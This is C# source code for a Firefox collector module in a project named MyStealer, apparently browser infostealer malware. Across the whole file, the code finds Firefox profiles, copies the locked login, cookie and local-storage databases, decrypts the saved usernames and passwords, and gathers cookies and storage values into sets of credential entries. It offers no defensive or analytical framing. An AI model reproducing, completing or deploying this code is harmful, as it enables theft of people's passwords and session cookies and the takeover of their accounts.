using MyStealer.Decryptor;
using Newtonsoft.Json.Linq;
using Serilog;
using Snappy;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace MyStealer.Collectors.Browser
{
    internal class Firefox : IBrowserCollector
    {
        public virtual string ApplicationName => "FireFox";
        protected virtual string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "FireFox", "Profiles");

        public virtual string[] LibDirectory => new string[] { "Mozilla FireFox" };

        private ISet<string> profilePathList;
        private IDictionary<string, MozillaDecryptor> profileDecryptor = new Dictionary<string, MozillaDecryptor>();

        public bool IsAvailable() => Directory.Exists(ProfilesPath);

        public void Initialize()
        {
            profilePathList = new HashSet<string>(Directory.GetDirectories(ProfilesPath, "*", SearchOption.TopDirectoryOnly));
            foreach (var profile in profilePathList)
            {
                try
                {
                    profileDecryptor[profile] = new MozillaDecryptor(LibDirectory, profile);
                }
                catch (Exception e)
                {
                    Log.Warning(e, "[{moduleName}] Failed to initialize decryptor for profile: {profile}", ApplicationName, profile);
                }
            }
        }

        public ISet<CredentialEntry> GetCredentials()
        {
            var set = new HashSet<CredentialEntry>();

            foreach (var profilePath in profilePathList)
            {
                foreach (var entry in ReadSignonsSqlite(profilePath))
                    set.Add(entry);
                foreach (var entry in ReadLoginsJson(profilePath))
                    set.Add(entry);
            }

            return set;
        }

        public ISet<CookieEntry> GetCookies()
        {
            var set = new HashSet<CookieEntry>();

            foreach (var profilePath in profilePathList)
            {
                foreach (var entry in ReadCookiesSqlite(profilePath))
                    set.Add(entry);
            }

            return set;
        }

        public ISet<LocalStorageEntry> GetLocalStorageEntries()
        {
            var set = new HashSet<LocalStorageEntry>();

            foreach (var profilePath in profilePathList)
            {
                var profileName = Path.GetFileName(profilePath);
                var storagesDir = Path.Combine(profilePath, "storage", "default");
                if (!Directory.Exists(storagesDir))
                    continue;

                foreach (var subDir in Directory.EnumerateDirectories(storagesDir))
                {
                    foreach (var entry in ReadStorages(profileName, Path.Combine(subDir, "ls", "data.sqlite")))
                        set.Add(entry);
                }
            }

            return set;
        }

        public ISet<CredentialEntry> ReadSignonsSqlite(string profilePath)
        {
            var set = new HashSet<CredentialEntry>();

            var dbPath = Path.Combine(profilePath, "signons.sqlite");
            if (!File.Exists(dbPath))
            {
                Log.Warning("[{moduleName}] signons.sqlite file does not exists for profile: {profile}", ApplicationName, profilePath);
                return set;
            }

            Log.Information("[{moduleName}] Begin parsing signons.sqlite file: {path}", ApplicationName, dbPath);

            if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
            {
                Log.Warning("[{moduleName}] Mozilla decryptor for profile {profile} is not available", ApplicationName, profilePath);
                return set;
            }

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Log.Debug("[{moduleName}] signons.sqlite file {path} copied to {randomName}", ApplicationName, dbPath, copyName);

            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT hostname,encryptedUsername,encryptedPassword FROM moz_logins;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var host = reader.GetString(0);
                            var username = decryptor.Decrypt(reader.GetString(1));
                            var password = decryptor.Decrypt(reader.GetString(2));

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(username))
                            {
                                set.Add(new CredentialEntry
                                {
                                    ApplicationName = $"{ApplicationName}",
                                    ApplicationProfileName = Path.GetFileName(profilePath),
                                    Url = host,
                                    UserName = username,
                                    Password = password
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Log.Warning(e, "[{moduleName}] Error reading signons.sqlite: {path}", ApplicationName, dbPath);
                return set;
            }
            finally
            {
                File.Delete(copyName);
                Log.Information("[{moduleName}] Read {n} login entries from signons.sqlite: {path}", ApplicationName, set.Count, dbPath);
            }

            return set;
        }

        public ISet<CredentialEntry> ReadLoginsJson(string profilePath)
        {
            var set = new HashSet<CredentialEntry>();

            var jsonPath = Path.Combine(profilePath, "logins.json");
            if (!File.Exists(jsonPath))
            {
                Log.Debug("[{moduleName}] No logins.json found from profile {profile}", ApplicationName, profilePath);
                return set;
            }

            Log.Information("[{moduleName}] Begin parsing Login Data file: {path}", ApplicationName, jsonPath);

            if (!profileDecryptor.TryGetValue(profilePath, out var decryptor))
            {
                Log.Warning("[{moduleName}] Mozilla decryptor for profile {profile} is not available", ApplicationName, profilePath);
                return set;
            }

            try
            {
                var json = JObject.Parse(File.ReadAllText(jsonPath));
                foreach (var loginEntry in json["logins"])
                {
                    var host = loginEntry["hostname"].Value<string>();
                    var username = decryptor.Decrypt(loginEntry["encryptedUsername"].Value<string>());
                    var password = decryptor.Decrypt(loginEntry["encryptedPassword"].Value<string>());
                    set.Add(new CredentialEntry
                    {
                        ApplicationName = ApplicationName,
                        ApplicationProfileName = Path.GetFileName(profilePath),
                        Url = host,
                        UserName = username,
                        Password = password
                    });
                }
            }
            catch (Exception ex)
            {
                Log.Warning(ex, "[{moduleName}] Error parsing logins.json: {path}", ApplicationName, jsonPath);
            }

            return set;
        }

        public ISet<CookieEntry> ReadCookiesSqlite(string profilePath)
        {
            var set = new HashSet<CookieEntry>();

            var dbPath = Path.Combine(profilePath, "cookies.sqlite");
            if (!File.Exists(dbPath))
            {
                Log.Warning("[{moduleName}] cookies.sqlite file does not exists for profile: {profile}", ApplicationName, profilePath);
                return set;
            }

            Log.Information("[{moduleName}] Begin parsing cookies.sqlite file: {path}", ApplicationName, dbPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Log.Debug("[{moduleName}] cookies.sqlite file {path} copied to {randomName}", ApplicationName, dbPath, copyName);

            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                using (var cmd = connection.CreateCommand())
                {
                    cmd.CommandText = "SELECT name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly,sameSite FROM moz_cookies;";

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var name = reader.GetString(0);
                            var value = reader.GetString(1);
                            var host = reader.GetString(2);
                            var path = reader.GetString(3);
                            var expiry = reader.GetInt64(4);
                            var lastAccessed = reader.GetInt64(5);
                            var creationTime = reader.GetInt64(6);
                            var isSecure = reader.GetInt16(7);
                            var isHttpOnly = reader.GetInt16(8);
                            var sameSite = reader.GetInt16(9);

                            var expiryDate = new DateTime(expiry, DateTimeKind.Local);
                            var lastAccessedDate = new DateTime(lastAccessed, DateTimeKind.Local);
                            var creationTimeDate = new DateTime(creationTime, DateTimeKind.Local);

                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name))
                            {
                                set.Add(new CookieEntry
                                {
                                    ApplicationName = $"{ApplicationName}",
                                    ApplicationProfileName = Path.GetFileName(profilePath),
                                    CreationDateTime = creationTimeDate,
                                    LastAccessDateTime = lastAccessedDate,
                                    ExpireDateTime = expiryDate,
                                    Host = host,
                                    Path = path,
                                    Name = name,
                                    Value = value,
                                    IsSecure = isSecure != 0,
                                    IsHttpOnly = isHttpOnly != 0,
                                    SameSite = sameSite,
                                    Priority = 1
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Log.Warning(e, "[{moduleName}] Error reading cookies.sqlite: {path}", ApplicationName, dbPath);
                return set;
            }
            finally
            {
                File.Delete(copyName);
                Log.Information("[{moduleName}] Read {n} cookie entries from cookies.sqlite: {path}", ApplicationName, set.Count, dbPath);
            }

            return set;
        }

        public ISet<LocalStorageEntry> ReadStorages(string profileName, string dbPath)
        {
            var set = new HashSet<LocalStorageEntry>();

            if (!File.Exists(dbPath))
            {
                Log.Warning("[{moduleName}] Local Storage data.sqlite file does not exists at: {path}", ApplicationName, dbPath);
                return set;
            }

            Log.Information("[{moduleName}] Begin parsing data.sqlite file: {path}", ApplicationName, dbPath);

            var copyName = Path.GetRandomFileName();
            File.Copy(dbPath, copyName, true); // prevent reading locked sql database
            Log.Debug("[{moduleName}] cookies.sqlite file {path} copied to {randomName}", ApplicationName, dbPath, copyName);

            try
            {
                using (var connection = new SQLiteConnection("Data Source=" + copyName).OpenAndReturn())
                {
                    string origin;
                    using (var cmd = connection.CreateCommand())
                    {
                        cmd.CommandText = "SELECT origin FROM database LIMIT 1;";
                        origin = cmd.ExecuteScalar().ToString();
                    }

                    using (var cmd = connection.CreateCommand())
                    {
                        cmd.CommandText = "SELECT key,utf16_length,compression_type,last_access_time,value FROM data;";

                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                var key = reader.GetString(0);
                                var utf16Length = reader.GetInt32(1);
                                var snappyCompressed = reader.GetInt16(2) != 0; // https://stackoverflow.com/a/77335474
                                var lastAccessed = new DateTime(reader.GetInt64(3), DateTimeKind.Local);
                                var value = new byte[reader.GetBytes(4, 0L, null, 0, 0)];
                                reader.GetBytes(4, 0L, value, 0, value.Length);

                                if (snappyCompressed)
                                {
                                    var buffer = new byte[SnappyCodec.GetUncompressedLength(value, 0, value.Length)];
                                    var written = SnappyCodec.Uncompress(value, 0, value.Length, buffer, 0);
                                    if (written != buffer.Length)
                                        throw new Exception("Snappy decompression length mismatch");

                                    value = buffer;
                                }

                                set.Add(new LocalStorageEntry
                                {
                                    ApplicationName = $"{ApplicationName}",
                                    ApplicationProfileName = profileName,
                                    Host = origin,
                                    Key = key,
                                    Value = Encoding.Unicode.GetString(value), // Value is encoded with UTF-16-LE
                                    AccessTimeStamp = lastAccessed
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Log.Warning(e, "[{moduleName}] Error reading data.sqlite: {path}", ApplicationName, dbPath);
                return set;
            }
            finally
            {
                File.Delete(copyName);
                Log.Information("[{moduleName}] Read {n} storage entries from data.sqlite: {path}", ApplicationName, set.Count, dbPath);
            }

            return set;
        }

        public void Dispose()
        {
            foreach (var decryptor in profileDecryptor.Values)
                decryptor.Dispose();
        }
    }
}
